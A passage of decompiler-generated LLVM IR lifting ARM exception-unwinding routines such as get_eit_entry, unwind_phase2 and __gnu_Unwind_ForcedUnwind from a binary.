  %v1_19334 = add i32 %context, 68
  %v2_19334 = inttoptr i32 %v1_19334 to i32*
  %v3_19334 = load i32, i32* %v2_19334, align 4
  ret i32 %v3_19334

; uselistorder directives
  uselistorder i32 68, { 11, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7, 10 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_19344 = add i32 %exc, 8
  %v2_19344 = inttoptr i32 %v1_19344 to i32*
  %v3_19344 = load i32, i32* %v2_19344, align 4
  %v2_19348 = icmp eq i32 %v3_19344, 0
  br i1 %v2_19348, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_1935c = xor i1 %v2_19348, true
  call void @__pseudo_cond_branch(i1 %v2_1935c, i32 %v3_19344)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19374 = call i32 @abort()
  ret i32 %v0_19374
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19380 = call i32 @abort()
  ret i32 %v0_19380
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19384 = load i32, i32* @r4, align 4
  store i32 %v3_19384, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r5.global-to-local, align 4
  %v4_19394 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 132) to i32*), align 4
  %v2_19398 = icmp eq i32 %v4_19394, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_193a4 = add i32 %return_address, -2
  store i32 %v1_193a4, i32* %r4.global-to-local, align 4
  br i1 %v2_19398, label %dec_label_pc_193dc, label %dec_label_pc_193ac

dec_label_pc_193ac:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_19394)
  %v2_193bc = icmp eq i32 %v1_193a4, 0
  br i1 %v2_193bc, label %.thread, label %dec_label_pc_193fcthread-pre-split

.thread:                                          ; preds = %dec_label_pc_193ac
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_193c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_193c4 = add i32 %v2_193c4, 16
  %v4_193c4 = inttoptr i32 %v3_193c4 to i32*
  store i32 0, i32* %v4_193c4, align 4
  br label %dec_label_pc_193cc

dec_label_pc_193cc:                               ; preds = %.thread, %.thread10, %dec_label_pc_19574, %dec_label_pc_19560, %dec_label_pc_1953c, %dec_label_pc_19514, %dec_label_pc_19414
  %v0_193cc = load i32, i32* %r2.global-to-local, align 4
  %v2_193d4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_193d4, i32* @r4, align 4
  ret i32 %v0_193cc

dec_label_pc_193dc:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_193e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 20) to i32*), align 4
  %v4_193e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 48) to i32*), align 4
  store i32 %v4_193e8, i32* %r2.global-to-local, align 4
  %v2_193ec = sub i32 %v4_193e4, %v4_193e8
  %v3_193f0 = sdiv i32 %v2_193ec, 8
  store i32 %v3_193f0, i32* %stack_var_-36, align 4
  br label %dec_label_pc_193fc

dec_label_pc_193fcthread-pre-split:               ; preds = %dec_label_pc_193ac
  %v3_193fc.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_193fc

dec_label_pc_193fc:                               ; preds = %dec_label_pc_193fcthread-pre-split, %dec_label_pc_193dc
  %v0_19440.pre = phi i32 [ %v1_193a4, %dec_label_pc_193fcthread-pre-split ], [ %v4_193e8, %dec_label_pc_193dc ]
  %v1_19404 = phi i32 [ %v3_193fc.pr, %dec_label_pc_193fcthread-pre-split ], [ %v3_193f0, %dec_label_pc_193dc ]
  %v2_19400 = icmp eq i32 %v1_19404, 0
  br i1 %v2_19400, label %dec_label_pc_19414, label %dec_label_pc_19430.preheader

dec_label_pc_19430.preheader:                     ; preds = %dec_label_pc_193fc
  %v2_19404 = add i32 %v1_19404, -1
  %v1_19460 = add i32 %v0_19440.pre, 8
  br label %dec_label_pc_19430.outer

dec_label_pc_19414.loopexit:                      ; preds = %dec_label_pc_1948c
  br label %dec_label_pc_19414

dec_label_pc_19414:                               ; preds = %dec_label_pc_19414.loopexit, %dec_label_pc_193fc, %dec_label_pc_19558
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1941c = load i32, i32* %r6.global-to-local, align 4
  %v2_1941c = add i32 %v1_1941c, 16
  %v3_1941c = inttoptr i32 %v2_1941c to i32*
  store i32 0, i32* %v3_1941c, align 4
  br label %dec_label_pc_193cc

dec_label_pc_19424:                               ; preds = %dec_label_pc_19480
  %v3_19424 = icmp ult i32 %storemerge40, %v0_19484
  br i1 %v3_19424, label %dec_label_pc_1942c, label %dec_label_pc_1949c

dec_label_pc_1942c:                               ; preds = %dec_label_pc_19424
  %v1_1942c = add nsw i32 %v3_19438, 1
  br label %dec_label_pc_19430.outer

dec_label_pc_19430.outer:                         ; preds = %dec_label_pc_1942c, %dec_label_pc_19430.preheader
  %v1_1948c.ph = phi i32 [ %v1_1942c, %dec_label_pc_1942c ], [ 0, %dec_label_pc_19430.preheader ]
  %v0_19430.ph = phi i32 [ %v0_19430, %dec_label_pc_1942c ], [ %v2_19404, %dec_label_pc_19430.preheader ]
  br label %dec_label_pc_19430

dec_label_pc_19430:                               ; preds = %dec_label_pc_19430.outer, %dec_label_pc_19494
  %v0_19430 = phi i32 [ %v1_19494, %dec_label_pc_19494 ], [ %v0_19430.ph, %dec_label_pc_19430.outer ]
  %v2_19430 = add i32 %v0_19430, %v1_1948c.ph
  %tmp = icmp slt i32 %v2_19430, 0
  %v4_19434 = zext i1 %tmp to i32
  %v5_19434 = add i32 %v4_19434, %v2_19430
  %v3_19438 = sdiv i32 %v5_19434, 2
  %v3_1943c = mul i32 %v3_19438, 8
  store i32 %v3_1943c, i32* @ip, align 4
  %v2_19440 = add i32 %v3_1943c, %v0_19440.pre
  %v3_19440 = inttoptr i32 %v2_19440 to i32*
  %v4_19440 = load i32, i32* %v3_19440, align 4
  %v1_19444 = and i32 %v4_19440, 1073741824
  %v2_19444 = icmp eq i32 %v1_19444, 0
  %v2_19448 = or i32 %v4_19440, -2147483648
  %tmp79 = bitcast i32 %v4_19440 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_1944c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_19444, i32 %v2_1944c, i32 %v2_19448
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_19450 = icmp eq i32 %v2_19404, %v3_19438
  store i32 %v2_19440, i32* %r7.global-to-local, align 4
  br i1 %v9_19450, label %dec_label_pc_19480, label %dec_label_pc_19460

dec_label_pc_19460:                               ; preds = %dec_label_pc_19430
  %v2_19464 = add i32 %v3_1943c, %v1_19460
  %v3_19464 = inttoptr i32 %v2_19464 to i32*
  %v4_19464 = load i32, i32* %v3_19464, align 4
  %v1_1946c = and i32 %v4_19464, 1073741824
  %v2_1946c = icmp eq i32 %v1_1946c, 0
  %v2_19470 = or i32 %v4_19464, -2147483648
  %tmp81 = bitcast i32 %v4_19464 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_19474 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_1946c, i32 %v2_19474, i32 %v2_19470
  %v1_19478 = add i32 %v2_19464, -1
  %v2_1947c = add i32 %storemerge39, %v1_19478
  br label %dec_label_pc_19480

dec_label_pc_19480:                               ; preds = %dec_label_pc_19430, %dec_label_pc_19460
  %storemerge40 = phi i32 [ %v2_1947c, %dec_label_pc_19460 ], [ -1, %dec_label_pc_19430 ]
  %v2_19480 = add i32 %storemerge, %v2_19440
  %v0_19484 = load i32, i32* %r4.global-to-local, align 4
  %v3_19484 = icmp ult i32 %v0_19484, %v2_19480
  br i1 %v3_19484, label %dec_label_pc_1948c, label %dec_label_pc_19424

dec_label_pc_1948c:                               ; preds = %dec_label_pc_19480
  %v9_1948c = icmp eq i32 %v3_19438, %v1_1948c.ph
  br i1 %v9_1948c, label %dec_label_pc_19414.loopexit, label %dec_label_pc_19494

dec_label_pc_19494:                               ; preds = %dec_label_pc_1948c
  %v1_19494 = add nsw i32 %v3_19438, -1
  br label %dec_label_pc_19430

dec_label_pc_1949c:                               ; preds = %dec_label_pc_19424
  %v2_1949c = load i32, i32* %v3_19440, align 4
  %v1_194a0 = and i32 %v2_1949c, 1073741824
  %v2_194a0 = icmp eq i32 %v1_194a0, 0
  %v2_194a4 = or i32 %v2_1949c, -2147483648
  %tmp83 = bitcast i32 %v2_1949c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_194a8 = bitcast float %tmp84 to i32
  %v0_194ac = select i1 %v2_194a0, i32 %v2_194a8, i32 %v2_194a4
  %v2_194ac = add i32 %v0_194ac, %v2_19440
  %v1_194b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_194b0 = add i32 %v1_194b0, 72
  %v3_194b0 = inttoptr i32 %v2_194b0 to i32*
  store i32 %v2_194ac, i32* %v3_194b0, align 4
  %v0_194b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_194b4 = add i32 %v0_194b4, 4
  %v2_194b4 = inttoptr i32 %v1_194b4 to i32*
  %v3_194b4 = load i32, i32* %v2_194b4, align 4
  %v7_194b8 = icmp eq i32 %v3_194b4, 1
  br i1 %v7_194b8, label %.thread10, label %dec_label_pc_194cc

.thread10:                                        ; preds = %dec_label_pc_1949c
  %v1_194b8 = add i32 %v3_194b4, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_194c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_194c4 = add i32 %v2_194c4, 16
  %v4_194c4 = inttoptr i32 %v3_194c4 to i32*
  store i32 %v1_194b8, i32* %v4_194c4, align 4
  br label %dec_label_pc_193cc

dec_label_pc_194cc:                               ; preds = %dec_label_pc_1949c
  %v1_194cc = icmp slt i32 %v3_194b4, 0
  br i1 %v1_194cc, label %.thread38, label %dec_label_pc_194e4

.thread38:                                        ; preds = %dec_label_pc_194cc
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_194d8 = load i32, i32* %r6.global-to-local, align 4
  %v5_194d8 = add i32 %v4_194d8, 76
  %v6_194d8 = inttoptr i32 %v5_194d8 to i32*
  store i32 %v1_194b4, i32* %v6_194d8, align 4
  %v3_194dc = load i32, i32* %r2.global-to-local, align 4
  %v4_194dc = load i32, i32* %r6.global-to-local, align 4
  %v5_194dc = add i32 %v4_194dc, 80
  %v6_194dc = inttoptr i32 %v5_194dc to i32*
  store i32 %v3_194dc, i32* %v6_194dc, align 4
  br label %dec_label_pc_19504

dec_label_pc_194e4:                               ; preds = %dec_label_pc_194cc
  %v1_194e4 = and i32 %v3_194b4, 1073741824
  %v2_194e4 = icmp eq i32 %v1_194e4, 0
  %v2_194e8 = or i32 %v3_194b4, -2147483648
  %tmp85 = bitcast i32 %v3_194b4 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_194ec = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_194e4, i32 %v2_194ec, i32 %v2_194e8
  %v1_194f0 = add i32 %storemerge42, 4
  %v2_194f4 = add i32 %v1_194f0, %v0_194b4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_194fc = load i32, i32* %r6.global-to-local, align 4
  %v2_194fc = add i32 %v1_194fc, 76
  %v3_194fc = inttoptr i32 %v2_194fc to i32*
  store i32 %v2_194f4, i32* %v3_194fc, align 4
  %v0_19500 = load i32, i32* %r2.global-to-local, align 4
  %v1_19500 = load i32, i32* %r6.global-to-local, align 4
  %v2_19500 = add i32 %v1_19500, 80
  %v3_19500 = inttoptr i32 %v2_19500 to i32*
  store i32 %v0_19500, i32* %v3_19500, align 4
  br label %dec_label_pc_19504

dec_label_pc_19504:                               ; preds = %.thread38, %dec_label_pc_194e4
  %v0_19504 = load i32, i32* %r6.global-to-local, align 4
  %v1_19504 = add i32 %v0_19504, 76
  %v2_19504 = inttoptr i32 %v1_19504 to i32*
  %v3_19504 = load i32, i32* %v2_19504, align 4
  store i32 %v3_19504, i32* %r2.global-to-local, align 4
  %v1_19508 = inttoptr i32 %v3_19504 to i32*
  %v2_19508 = load i32, i32* %v1_19508, align 4
  %v1_1950c = icmp slt i32 %v2_19508, 0
  br i1 %v1_1950c, label %dec_label_pc_19530, label %dec_label_pc_19514

dec_label_pc_19514:                               ; preds = %dec_label_pc_19504
  %v1_19514 = and i32 %v2_19508, 1073741824
  %v2_19514 = icmp eq i32 %v1_19514, 0
  %v2_19518 = or i32 %v2_19508, -2147483648
  %tmp87 = bitcast i32 %v2_19508 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1951c = bitcast float %tmp88 to i32
  %v0_19520 = select i1 %v2_19514, i32 %v2_1951c, i32 %v2_19518
  %v2_19520 = add i32 %v0_19520, %v3_19504
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_19528 = add i32 %v0_19504, 16
  %v3_19528 = inttoptr i32 %v2_19528 to i32*
  store i32 %v2_19520, i32* %v3_19528, align 4
  br label %dec_label_pc_193cc

dec_label_pc_19530:                               ; preds = %dec_label_pc_19504
  %v3_19530 = udiv i32 %v2_19508, 16777216
  %v1_19534 = urem i32 %v3_19530, 16
  %v2_19534 = icmp eq i32 %v1_19534, 0
  br i1 %v2_19534, label %dec_label_pc_1953c, label %dec_label_pc_19550

dec_label_pc_1953c:                               ; preds = %dec_label_pc_19530
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19544 = load i32, i32* %r5.global-to-local, align 4
  %v2_19544 = add i32 %v0_19544, -37056
  %v2_19548 = add i32 %v0_19504, 16
  %v3_19548 = inttoptr i32 %v2_19548 to i32*
  store i32 %v2_19544, i32* %v3_19548, align 4
  br label %dec_label_pc_193cc

dec_label_pc_19550:                               ; preds = %dec_label_pc_19530
  %v7_19550 = icmp eq i32 %v1_19534, 1
  br i1 %v7_19550, label %dec_label_pc_19574, label %dec_label_pc_19558

dec_label_pc_19558:                               ; preds = %dec_label_pc_19550
  %v7_19558 = icmp eq i32 %v1_19534, 2
  br i1 %v7_19558, label %dec_label_pc_19560, label %dec_label_pc_19414

dec_label_pc_19560:                               ; preds = %dec_label_pc_19558
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19568 = load i32, i32* %r5.global-to-local, align 4
  %v2_19568 = add i32 %v0_19568, -37072
  %v2_1956c = add i32 %v0_19504, 16
  %v3_1956c = inttoptr i32 %v2_1956c to i32*
  store i32 %v2_19568, i32* %v3_1956c, align 4
  br label %dec_label_pc_193cc

dec_label_pc_19574:                               ; preds = %dec_label_pc_19550
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1957c = load i32, i32* %r5.global-to-local, align 4
  %v2_1957c = add i32 %v0_1957c, -37064
  %v2_19580 = add i32 %v0_19504, 16
  %v3_19580 = inttoptr i32 %v2_19580 to i32*
  store i32 %v2_1957c, i32* %v3_19580, align 4
  br label %dec_label_pc_193cc

; uselistorder directives
  uselistorder i32 %v1_19534, { 2, 1, 0 }
  uselistorder i32 %v0_19504, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_194b4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_19484, { 1, 0 }
  uselistorder i32 %v3_1943c, { 2, 1, 0 }
  uselistorder i32 %v3_19438, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_19430, { 1, 0 }
  uselistorder i32 %v0_19430, { 1, 0 }
  uselistorder i32 %v2_19404, { 1, 0 }
  uselistorder i32 %v0_19440.pre, { 1, 0 }
  uselistorder i32 %v3_193f0, { 1, 0 }
  uselistorder i32 %v1_193a4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 6, 7, 8, 9, 4, 5, 2, 3, 1 }
  uselistorder label %dec_label_pc_19504, { 1, 0 }
  uselistorder label %dec_label_pc_19480, { 1, 0 }
  uselistorder label %dec_label_pc_19430, { 1, 0 }
  uselistorder label %dec_label_pc_19414, { 2, 0, 1 }
  uselistorder label %dec_label_pc_193cc, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1958c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1958c:
  %v0_1958c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1958c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1958c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1958c, %bb
  %v10_19594 = phi i32 [ %arg1, %dec_label_pc_1958c ], [ 0, %bb ]
  ret i32 %v10_19594

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_195a8 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_195bc = inttoptr i32 %v1_195a8 to i32*
  %v2_195bc = load i32, i32* %v1_195bc, align 4
  store i32 %v2_195bc, i32* %r0.global-to-local, align 4
  %v12_195bc = add i32 %entry_vrs, 20
  %v1_195c8 = inttoptr i32 %v12_195bc to i32*
  %v2_195c8 = load i32, i32* %v1_195c8, align 4
  store i32 %v2_195c8, i32* %r0.global-to-local, align 4
  %v12_195c8 = add i32 %entry_vrs, 36
  %v1_195d0 = inttoptr i32 %v12_195c8 to i32*
  %v2_195d0 = load i32, i32* %v1_195d0, align 4
  store i32 %v2_195d0, i32* %r0.global-to-local, align 4
  %v12_195d0 = add i32 %entry_vrs, 52
  store i32 %v12_195d0, i32* @ip, align 4
  %v13_195d4 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_195d4, i32* @lr, align 4
  %v1_195d8 = inttoptr i32 %v12_195d0 to i32*
  %v2_195d8 = load i32, i32* %v1_195d8, align 4
  store i32 %v2_195d8, i32* %r0.global-to-local, align 4
  %v9_195d8 = add i32 %entry_vrs, 64
  %v10_195d8 = inttoptr i32 %v9_195d8 to i32*
  %v11_195d8 = load i32, i32* %v10_195d8, align 4
  store i32 0, i32* @r4, align 4
  %v1_195e0 = add i32 %ucbp, 12
  %v2_195e0 = inttoptr i32 %v1_195e0 to i32*
  %v3_195e0 = load i32, i32* %v2_195e0, align 4
  store i32 %v2_195d8, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_195f8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_195d8)
  store i32 %v2_195f8, i32* %r0.global-to-local, align 4
  %v0_195fc = load i32, i32* @r6, align 4
  %v1_195fc = load i32, i32* @r4, align 4
  %v9_195fc = icmp eq i32 %v0_195fc, %v1_195fc
  store i32 %v2_195f8, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_195fc, label %dec_label_pc_19610, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1961c

dec_label_pc_19610:                               ; preds = %entry
  store i32 %v0_195fc, i32* @r4, align 4
  br label %dec_label_pc_19618

dec_label_pc_19618:                               ; preds = %dec_label_pc_196e0, %dec_label_pc_19610
  br label %dec_label_pc_1961c

dec_label_pc_1961c:                               ; preds = %.thread, %dec_label_pc_19618
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_19618 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1961c = icmp eq i32 %v2_195f8, 0
  br i1 %v2_1961c, label %dec_label_pc_19694, label %.thread2.dec_label_pc_19630_crit_edge

.thread2.dec_label_pc_19630_crit_edge:            ; preds = %dec_label_pc_1961c
  br label %dec_label_pc_19630

dec_label_pc_19630:                               ; preds = %.thread2.dec_label_pc_19630_crit_edge, %dec_label_pc_19694
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_19640 = load i32, i32* @r5, align 4
  store i32 %v0_19640, i32* @r3, align 4
  store i32 104016, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_195e0)
  br i1 false, label %dec_label_pc_19658, label %dec_label_pc_19680

dec_label_pc_19658:                               ; preds = %dec_label_pc_19630
  br i1 undef, label %dec_label_pc_19660, label %dec_label_pc_19684

dec_label_pc_19660:                               ; preds = %dec_label_pc_19658
  br i1 undef, label %dec_label_pc_196e0, label %dec_label_pc_19678

dec_label_pc_19678:                               ; preds = %dec_label_pc_19660
  br i1 undef, label %dec_label_pc_196d8, label %dec_label_pc_19680

dec_label_pc_19680:                               ; preds = %dec_label_pc_19630, %dec_label_pc_19678
  br label %dec_label_pc_19684

dec_label_pc_19684:                               ; preds = %dec_label_pc_19658, %dec_label_pc_19680
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_19694:                               ; preds = %dec_label_pc_1961c
  store i32 %v11_195d8, i32* @r3, align 4
  %v2_19698 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_19698, i32* @r4, align 4
  %v1_1969c = load i32, i32* @r5, align 4
  %v2_1969c = add i32 %v1_1969c, 20
  %v3_1969c = inttoptr i32 %v2_1969c to i32*
  store i32 %v11_195d8, i32* %v3_1969c, align 4
  store i32 %v2_19698, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_196ac = call i32 @memcpy()
  %v0_196b4 = load i32, i32* @r6, align 4
  store i32 %v0_196b4, i32* %r0.global-to-local, align 4
  %v0_196b8 = load i32, i32* @r5, align 4
  %v1_196bc = add i32 %v0_196b8, 16
  %v2_196bc = inttoptr i32 %v1_196bc to i32*
  %v3_196bc = load i32, i32* %v2_196bc, align 4
  store i32 %v3_196bc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_196bc)
  %v0_196cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_196cc, i32* @r4, align 4
  br label %dec_label_pc_19630

dec_label_pc_196d8:                               ; preds = %dec_label_pc_19678
  br label %dec_label_pc_196e0

dec_label_pc_196e0:                               ; preds = %dec_label_pc_19660, %dec_label_pc_196d8
  br label %dec_label_pc_19618

; uselistorder directives
  uselistorder i32 %v11_195d8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 ()* @memcpy, { 0, 6, 5, 2, 1, 4, 3, 8, 7 }
  uselistorder i32 304, { 1, 0 }
  uselistorder i32* @r3, { 104, 105, 40, 41, 29, 106, 107, 32, 108, 109, 3, 110, 111, 112, 4, 113, 114, 115, 5, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 0, 134, 135, 136, 137, 30, 31, 33, 34, 35, 36, 37, 38, 39, 80, 63, 64, 65, 138, 139, 152, 153, 154, 142, 143, 144, 145, 146, 1, 147, 6, 43, 44, 140, 141, 55, 56, 101, 102, 103, 95, 96, 97, 99, 98, 9, 10, 11, 158, 155, 156, 157, 2, 159, 160, 161, 42, 66, 45, 46, 47, 48, 49, 50, 148, 149, 150, 151, 57, 58, 59, 86, 87, 88, 89, 67, 68, 69, 8, 90, 91, 92, 93, 94, 24, 13, 15, 12, 14, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 51, 52, 53, 100, 54, 60, 61, 62, 70, 7, 71, 72, 73, 74, 75, 76, 77, 78, 79, 81, 82, 83, 84, 85 }
  uselistorder i32 10, { 3, 4, 34, 35, 36, 7, 51, 50, 83, 0, 47, 48, 82, 52, 53, 1, 37, 9, 29, 31, 10, 30, 11, 32, 12, 33, 26, 5, 38, 27, 28, 39, 25, 40, 13, 41, 14, 42, 15, 43, 16, 44, 17, 45, 46, 18, 19, 20, 49, 8, 54, 55, 56, 57, 58, 59, 60, 21, 61, 62, 63, 22, 64, 65, 66, 2, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 6, 80, 23, 81, 24 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_196e0, { 1, 0 }
  uselistorder label %dec_label_pc_19684, { 1, 0 }
  uselistorder label %dec_label_pc_19680, { 1, 0 }
  uselistorder label %dec_label_pc_19630, { 1, 0 }
  uselistorder label %dec_label_pc_1961c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_196f4 = add i32 %ucbp, 12
  %v3_196f4 = inttoptr i32 %v2_196f4 to i32*
  store i32 %stop_fn, i32* %v3_196f4, align 4
  %v3_196f8 = add i32 %ucbp, 24
  %v4_196f8 = inttoptr i32 %v3_196f8 to i32*
  store i32 %tmp, i32* %v4_196f8, align 4
  %v1_196fc = add i32 %entry_vrs, 60
  %v2_196fc = inttoptr i32 %v1_196fc to i32*
  %v3_196fc = load i32, i32* %v2_196fc, align 4
  %v2_19704 = add i32 %entry_vrs, 64
  %v3_19704 = inttoptr i32 %v2_19704 to i32*
  store i32 %v3_196fc, i32* %v3_19704, align 4
  %v3_1970c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1970c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_197246 = add i32 %vrs, 64
  %v2_197247 = inttoptr i32 %v1_197246 to i32*
  %v3_197248 = load i32, i32* %v2_197247, align 4
  %v2_197289 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_197248)
  store i32 %v2_197289, i32* %r0.global-to-local, align 4
  %v2_1972c11 = icmp eq i32 %v2_197289, 0
  br i1 %v2_1972c11, label %dec_label_pc_19734, label %dec_label_pc_19764

dec_label_pc_19734:                               ; preds = %entry, %dec_label_pc_19734.dec_label_pc_19720_crit_edge
  %v0_19734 = load i32, i32* @r5, align 4
  %v1_19734 = add i32 %v0_19734, 64
  %v2_19734 = inttoptr i32 %v1_19734 to i32*
  %v3_19734 = load i32, i32* %v2_19734, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1973c = load i32, i32* @r4, align 4
  %v2_1973c = add i32 %v1_1973c, 20
  %v3_1973c = inttoptr i32 %v2_1973c to i32*
  store i32 %v3_19734, i32* %v3_1973c, align 4
  %v0_19740 = load i32, i32* @r4, align 4
  %v1_19748 = add i32 %v0_19740, 16
  %v2_19748 = inttoptr i32 %v1_19748 to i32*
  %v3_19748 = load i32, i32* %v2_19748, align 4
  call void @__pseudo_branch(i32 %v3_19748)
  %v0_19754 = load i32, i32* %r0.global-to-local, align 4
  %v7_19754 = icmp eq i32 %v0_19754, 8
  br i1 %v7_19754, label %dec_label_pc_19734.dec_label_pc_19720_crit_edge, label %dec_label_pc_1975c

dec_label_pc_19734.dec_label_pc_19720_crit_edge:  ; preds = %dec_label_pc_19734
  %v0_19720.pre = load i32, i32* @r4, align 4
  %v0_19724.pre = load i32, i32* @r5, align 4
  store i32 %v0_19720.pre, i32* %r0.global-to-local, align 4
  %v1_19724 = add i32 %v0_19724.pre, 64
  %v2_19724 = inttoptr i32 %v1_19724 to i32*
  %v3_19724 = load i32, i32* %v2_19724, align 4
  %v2_19728 = call i32 @get_eit_entry(i32 %v0_19720.pre, i32 %v3_19724)
  store i32 %v2_19728, i32* %r0.global-to-local, align 4
  %v2_1972c = icmp eq i32 %v2_19728, 0
  br i1 %v2_1972c, label %dec_label_pc_19734, label %dec_label_pc_19764

dec_label_pc_1975c:                               ; preds = %dec_label_pc_19734
  %v7_1975c = icmp eq i32 %v0_19754, 7
  br i1 %v7_1975c, label %dec_label_pc_19768, label %dec_label_pc_19764

dec_label_pc_19764:                               ; preds = %entry, %dec_label_pc_19734.dec_label_pc_19720_crit_edge, %dec_label_pc_1975c
  %v0_19764 = call i32 @abort()
  store i32 %v0_19764, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19768

dec_label_pc_19768:                               ; preds = %dec_label_pc_1975c, %dec_label_pc_19764
  %v0_19768 = load i32, i32* @r5, align 4
  %v1_19768 = add i32 %v0_19768, 4
  store i32 %v1_19768, i32* %r0.global-to-local, align 4
  %v1_1976c = inttoptr i32 %v1_19768 to i32*
  %v2_1976c = call i32 @__restore_core_regs(i32* %v1_1976c)
  store i32 %v2_1976c, i32* %r0.global-to-local, align 4
  ret void

